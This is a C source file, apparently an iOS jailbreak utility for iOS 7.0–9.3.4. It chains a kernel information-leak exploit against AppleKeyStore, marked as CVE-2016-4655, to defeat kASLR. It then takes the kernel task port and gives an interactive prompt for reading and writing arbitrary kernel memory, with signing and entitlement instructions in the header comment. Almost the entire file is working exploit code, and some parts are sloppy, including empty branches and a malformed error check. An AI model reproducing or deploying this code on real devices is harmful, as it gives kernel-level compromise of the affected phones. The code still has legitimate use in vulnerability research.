//vm_write by @tomitokics
// 2019-01-08



/*


 You can use the program to write to a specific address in kernel!
 Its should work from iOS 7.0 - 9.3.4 as the program defeats kASLR

 
 
 To compile this you need the correct entitlements
 
 
 put this in a file named tfp.plist
 
 
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd …">
 <plist version="1.0">
 <dict>
 <key>get-task-allow</key>
 <true/>
 <key>proc_info-allow</key>
 <true/>
 <key>run-unsigned-code</key>
 <true/>
 <key>task_for_pid-allow</key>
 <true/>
 </dict>
 </plist>



and once you comile it you want to sign with ldid.

 ldid -Stfp.plist vm_read-write



*/










#include <stdio.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>


enum {
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
};



//kernel exploit to defeat kASLR

unsigned int get_kernel_base(){
    
    
    
    unsigned int base = 0;
    
    uint32_t dict[] = {
        0x000000d3, //
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,
        kOSSerializeSymbol | 4,
        0x00414141,
        kOSSerializeEndCollection | kOSSerializeNumber | 0x200,
        0x41414141,
        0x41414141
        
        
        
        
    };
    
    
    size_t idx = sizeof(dict);
    
    io_service_t serv = 0;
    io_connect_t conn = 0;
    io_iterator_t iter = 0;
    
    mach_port_t master = MACH_PORT_NULL, res = MACH_PORT_NULL;
    
    kern_return_t kr = 0, err = 0;
    
    
    
    host_get_io_master_port(mach_host_self(), &master);
    
    
    
    if (kr == io_service_get_matching_services_bin(master,(char*)dict,idx,&res) != KERN_SUCCESS){
        
        
    }else {
        
        
    }
    
    
    serv = IOServiceGetMatchingService(master,IOServiceMatching("AppleKeyStore"));
    
    kr = io_service_open_extended(serv,mach_task_self(),0,NDR_record,(io_buf_ptr_t)dict,idx,&err,&conn);
    
    if (kr == KERN_SUCCESS){
        
        
        
    }else{
        
       
        
        return -1;
    }
    
    IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
    
    
    io_object_t object = 0;
    
    uint32_t bytes = 0;
    char buf[0x200] = {0};
    
    while (bytes == 0){
        
        if (object){
            
            IOObjectRelease(object);
            
            
        }
        
        object = IOIteratorNext(iter);
        
        mach_msg_type_number_t bufCnt = 0x200;
        
        kr = io_registry_entry_get_property_bytes(object,(char*)"AAA",(char*)&buf,&bufCnt);
        
        bytes = *(uint32_t*)(buf);
        
    }
    
    
    
    
    
    
    
    base = (*(uint32_t *)(buf+36)& 0xFFF00000) + 0x1000;
    
    
    
    return base;
    
    
}



unsigned int get_kernel_slide(){
    
    //CVE 2016-4655
    
    
    
    
    unsigned int kbase = get_kernel_base();
    unsigned int kslide = 0;
    
    
    
    
    uint32_t dict[] = {
        0x000000d3,
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,
        kOSSerializeSymbol | 4,
        0x00414141,
        kOSSerializeEndCollection | kOSSerializeNumber | 0x200,
        0x41414141,
        0x41414141
        
        
        
        
    };
    
    
    size_t idx = sizeof(dict);
    
    io_service_t serv = 0;
    io_connect_t conn = 0;
    io_iterator_t iter = 0;
    
    mach_port_t master = MACH_PORT_NULL, res = MACH_PORT_NULL;
    
    kern_return_t kr = 0, err = 0;
    
    
    
    
    host_get_io_master_port(mach_host_self(), &master);
    
   
    
    
    
    
    
    if (kr == io_service_get_matching_services_bin(master,(char*)dict,idx,&res) != KERN_SUCCESS){
        
    }else {
        
        
    }
    
    
    serv = IOServiceGetMatchingService(master,IOServiceMatching("AppleKeyStore"));
    
    kr = io_service_open_extended(serv,mach_task_self(),0,NDR_record,(io_buf_ptr_t)dict,idx,&err,&conn);
    
    if (kr == KERN_SUCCESS){
       
        
        
    }else{
        
               
       
    }
    
    IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
    
    
    io_object_t object = 0;
    
    uint32_t bytes = 0;
    char buf[0x200] = {0};
    
    while (bytes == 0){
        
        if (object){
            
            IOObjectRelease(object);
           
            
        }
        
        object = IOIteratorNext(iter);
        
        mach_msg_type_number_t bufCnt = 0x200;
        
        kr = io_registry_entry_get_property_bytes(object,(char*)"AAA",(char*)&buf,&bufCnt);
        
        
        bytes = *(uint32_t*)(buf);
        
    }
    
    
    
    
    
    
    
    
    
    
    for (int a = 0; a < 128; a += 4){
        
        
        
        
        
        
    }
    
    

    
    
    
    
    
    
    kslide = kbase - 0x80001000;
    
    
    
    return kslide;
}


int get_task_port(){
    
    
    kern_return_t kr;
    mach_port_t task_port;
    
    kr = task_for_pid(mach_task_self(),0,&task_port);
    
    if(kr != KERN_SUCCESS){
        
        printf("%s\n",mach_error_string(kr));
        
    }else {
        
        printf("Got task port!\n");
    }
    
    
    
    
    return task_port;
}

void write_test(int task,unsigned int addr,unsigned int where,unsigned int kslide){
    
    kern_return_t kernel;
    if (kernel = vm_write(task,(vm_address_t)where + kslide,(vm_address_t)&addr,sizeof(addr))){
        
        printf("%s\n",mach_error_string(kernel));
        
    }else {
        
        
        printf("Successfully wrote 0x%x to 0x%x!\n",addr,where);
        
    }
    
    
    
}




void read_test(int task, unsigned int kslide, unsigned int address,size_t size){
    
    
    kern_return_t kernel;
    unsigned char buffer[size];
    
    kernel = vm_read_overwrite(task,(vm_address_t)address + kslide,size,(vm_address_t)&buffer,&size);
    
    if(kernel != KERN_SUCCESS){
        
        printf("Failed to read! - %s\n",mach_error_string(kernel));
    }
    
    
    int a = 0;
    for(int i = 0; i < size; i+=8){
        
        
        printf("0x%.08x: %.02x%.02x%.02x%.02x %.02x%.02x%.02x%.02x\n\n",address+i,buffer[a],buffer[a+1],buffer[a+2],buffer[a+3],buffer[a+4],buffer[a+5],buffer[a+6],buffer[a+7]);    //thanks @bellis100
        a+=8;
        
    }
    
    
    
    
}

int main(){
    
    
    unsigned int kslide = get_kernel_slide();
    
    printf("vm_read-write by @tomitokics!\n\nUse \"help\" for help\n\n");
    printf("kASLR slide: %#x\n\n",kslide);
    
    
    while(1){
    
    char readOrWrite[32];
    scanf("%s",readOrWrite);
    if(!strcmp(readOrWrite, "help")){
        
        
        printf("\n\n\"help\" - prints this message!\n\"q\" - Quit the program!\n\"read\" - You can read from kernel by specifiying the kernel address and the size(bytes) you want to read!\n<read usage:> <address>\n<read usage:> <size>\n\"write\" - You can write to kernel by specifying the address and what you want to write!\n<write usage:> <address>\n<write usage:> <bytes>\n\n");
        
        
    }else if(!strcmp(readOrWrite, "q")){
        
        return 0;
        
    }else if(!strcmp(readOrWrite, "read")){
        
        printf("Read was chosen!\n\n");
        
        unsigned int address = 0;
        int size = 0;
        scanf("%x",&address);
        printf("You will read from %#x (with kslide added)\n",address + kslide);
        scanf("%d",&size);
        printf("You will read %d bytes from %#x\n",size, address + kslide);
       
        int port = get_task_port();
        read_test(port,kslide,address,size);
        
    }else if(!strcmp(readOrWrite, "write")){
        
        
    printf("Write was chosen!\n\n");
  
    unsigned int where = 0;
    unsigned int what = 0;
    scanf("%x",&where);
    printf("You will write to %#x (with kslide added!)\n",where + kslide);
    scanf("%x",&what);
    printf("You will write 0x%x to 0x%x!\n",what,where + kslide);
   
    
    int task = get_task_port();
    write_test(task,what,where,kslide);
        
    }else {
        
        printf("Invalid Command!\n\n");
        
    }
        
}
    
    
    return 0;
}


